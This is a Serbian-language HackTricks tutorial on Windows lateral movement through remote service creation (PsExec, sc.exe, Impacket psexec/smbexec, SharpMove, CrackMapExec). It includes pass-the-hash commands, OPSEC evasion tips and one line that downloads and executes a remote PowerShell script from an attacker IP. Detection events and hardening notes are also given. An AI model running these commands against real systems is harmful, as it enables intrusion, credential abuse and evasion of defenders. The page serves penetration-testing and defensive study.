# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Kako funkcionišu

Ove tehnike zloupotrebljavaju Windows Service Control Manager (SCM) na daljinu preko SMB/RPC da izvrše komande na ciljanom hostu. Uobičajeni tok je:

1. Autentifikujte se na cilj i pristupite ADMIN$ deljenju preko SMB (TCP/445).
2. Kopirajte izvršni fajl ili navedite LOLBAS komandnu liniju koju će servis izvršiti.
3. Kreirajte servis na daljinu putem SCM (MS-SCMR preko \PIPE\svcctl) koji pokazuje na tu komandu ili binarni fajl.
4. Pokrenite servis da izvrši payload i opcionalno uhvatite stdin/stdout putem imenovane cevi.
5. Zaustavite servis i očistite (obrišite servis i sve preuzete binarne fajlove).

Zahtevi/preduslovi:
- Lokalni administrator na cilju (SeCreateServicePrivilege) ili eksplicitna prava za kreiranje servisa na cilju.
- SMB (445) dostupan i ADMIN$ deljenje dostupno; Udaljeno upravljanje servisima dozvoljeno kroz firewall hosta.
- UAC udaljena ograničenja: sa lokalnim nalozima, filtriranje tokena može blokirati admin pristup preko mreže osim ako se koristi ugrađeni Administrator ili LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: korišćenje imena hosta/FQDN omogućava Kerberos; povezivanje putem IP adrese često se vraća na NTLM (i može biti blokirano u učvršćenim okruženjima).

### Ručni ScExec/WinExec putem sc.exe

Sledeće prikazuje minimalni pristup kreiranju servisa. Slika servisa može biti preuzeti EXE ili LOLBAS kao što su cmd.exe ili powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Napomene:
- Očekujte grešku vremenskog ograničenja prilikom pokretanja EXE-a koji nije servis; izvršenje se i dalje dešava.
- Da biste ostali više OPSEC-prijateljski, preferirajte komande bez datoteka (cmd /c, powershell -enc) ili obrišite preuzete artefakte.

Pronađite detaljnije korake na: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Alati i primeri

### Sysinternals PsExec.exe

- Klasičan alat za administraciju koji koristi SMB za preuzimanje PSEXESVC.exe u ADMIN$, instalira privremenu uslugu (podrazumevano ime PSEXESVC) i proksira I/O preko imenovanih cevi.
- Primeri korišćenja:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Možete pokrenuti direktno sa Sysinternals Live putem WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Ostavlja događaje instalacije/deinstalacije servisa (Ime servisa često PSEXESVC osim ako nije korišćena opcija -r) i kreira C:\Windows\PSEXESVC.exe tokom izvršavanja.

### Impacket psexec.py (slično PsExec-u)

- Koristi ugrađenu uslugu sličnu RemCom-u. Postavlja privremeni binarni fajl servisa (obično sa nasumičnim imenom) putem ADMIN$, kreira servis (podrazumevano često RemComSvc) i prosleđuje I/O preko imenovane cevi.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- Privremeni EXE u C:\Windows\ (nasumičnih 8 karaktera). Ime servisa podrazumevano je RemComSvc osim ako nije promenjeno.

### Impacket smbexec.py (SMBExec)

- Kreira privremenu uslugu koja pokreće cmd.exe i koristi imenovanu cev za I/O. Generalno izbegava ispuštanje pune EXE korisničke datoteke; izvršavanje komandi je polu-interaktivno.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral i SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementira nekoliko metoda lateralnog kretanja uključujući izvršavanje zasnovano na servisima.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) uključuje modifikaciju/kreiranje servisa za izvršavanje komande na daljinu.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Možete takođe koristiti CrackMapExec za izvršavanje putem različitih backend-a (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detekcija i artefakti

Tipični host/network artefakti prilikom korišćenja PsExec-sličnih tehnika:
- Security 4624 (Logon Type 3) i 4672 (Special Privileges) na cilju za admin nalog koji se koristi.
- Security 5140/5145 File Share i File Share Detailed događaji koji prikazuju ADMIN$ pristup i kreiranje/pisanje servisnih binarnih fajlova (npr., PSEXESVC.exe ili nasumični 8-znamenkasti .exe).
- Security 7045 Service Install na cilju: imena servisa kao što su PSEXESVC, RemComSvc, ili prilagođeni (-r / -service-name).
- Sysmon 1 (Process Create) za services.exe ili sliku servisa, 3 (Network Connect), 11 (File Create) u C:\Windows\, 17/18 (Pipe Created/Connected) za cevi kao što su \\.\pipe\psexesvc, \\.\pipe\remcom_*, ili nasumične ekvivalente.
- Registry artefakt za Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hostu operatera (ako nije potisnuto).

Ideje za lov
- Upozorenje na instalacije servisa gde ImagePath uključuje cmd.exe /c, powershell.exe, ili TEMP lokacije.
- Tražiti kreacije procesa gde je ParentImage C:\Windows\PSEXESVC.exe ili deca services.exe koja se izvršavaju kao LOCAL SYSTEM pokrećući shell-ove.
- Obeležiti imenovane cevi koje se završavaju sa -stdin/-stdout/-stderr ili poznatim imenima cevi PsExec klonova.

## Rešavanje uobičajenih grešaka
- Pristup je odbijen (5) prilikom kreiranja servisa: nije pravi lokalni admin, UAC udaljena ograničenja za lokalne naloge, ili EDR zaštita od manipulacije na putanji servisnog binarnog fajla.
- Mrežni put nije pronađen (53) ili nije moglo da se poveže na ADMIN$: vatrozid blokira SMB/RPC ili su admin deljenja onemogućena.
- Kerberos ne uspeva, ali NTLM je blokiran: povežite se koristeći hostname/FQDN (ne IP), osigurajte ispravne SPN-ove, ili obezbedite -k/-no-pass sa tiketima prilikom korišćenja Impacket-a.
- Početak servisa ističe, ali payload je izvršen: očekivano ako nije pravi servisni binarni fajl; snimite izlaz u fajl ili koristite smbexec za live I/O.

## Beleške o učvršćivanju (moderne promene)
- Windows 11 24H2 i Windows Server 2025 zahtevaju SMB potpisivanje po defaultu za odlazne (i Windows 11 dolazne) veze. Ovo ne prekida legitimnu upotrebu PsExec-a sa validnim kredencijalima, ali sprečava zloupotrebu nesigniranog SMB relaya i može uticati na uređaje koji ne podržavaju potpisivanje.
- Novi SMB klijent NTLM blokiranje (Windows 11 24H2/Server 2025) može sprečiti NTLM fallback prilikom povezivanja putem IP-a ili na ne-Kerberos servere. U učvršćenim okruženjima ovo će prekinuti NTLM-bazirani PsExec/SMBExec; koristite Kerberos (hostname/FQDN) ili konfigurišite izuzetke ako je legitimno potrebno.
- Princip minimalnih privilegija: minimizujte članstvo lokalnog admina, preferirajte Just-in-Time/Just-Enough Admin, sprovodite LAPS, i pratite/upalite upozorenja na 7045 instalacije servisa.

## Takođe pogledajte

- WMI-bazirani udaljeni exec (često više bezfajlovni):
{{#ref}}
lateral-movement/wmiexec.md
{{#endref}}

- WinRM-bazirani udaljeni exec:
{{#ref}}
lateral-movement/winrm.md
{{#endref}}



## Reference

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- SMB sigurnosno učvršćivanje u Windows Server 2025 & Windows 11 (potpisivanje po defaultu, NTLM blokiranje): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
